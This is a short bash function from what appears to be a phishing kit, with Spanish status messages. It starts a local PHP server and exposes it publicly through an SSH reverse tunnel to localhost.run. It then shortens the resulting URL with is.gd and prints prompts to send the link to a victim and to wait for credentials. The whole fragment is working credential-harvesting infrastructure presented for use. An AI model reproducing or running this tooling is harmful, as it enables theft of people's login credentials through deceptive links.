starting(){                                                     

  echo -e "\n [++] Abriendo servidores..."
  php -S localhost:8080 &>/dev/null &
  sleep 2
  ssh -o 'StrictHostKeyChecking=no' -o 'UserKnownHostsFile=/dev/null' -R 80:localhost:8080 nokey@localhost.run >link.txt 2>/dev/null &
  sleep 3
  echo -e " [++] Envíe link: $(cat link.txt | grep -o "https://[a-zA-Z0-9\.]*.link")"
  echo -e " [++] Link acortado: $(curl -s -X POST https://is.gd/create.php -F "url=$(cat link.txt | grep -o "https://[a-zA-Z0-9\.]*.link")" | grep -ioE "https://is.gd/[0-9a-zA-Z]*" | head -n1)"
  echo -e " [++] Esperando credenciales..."
}
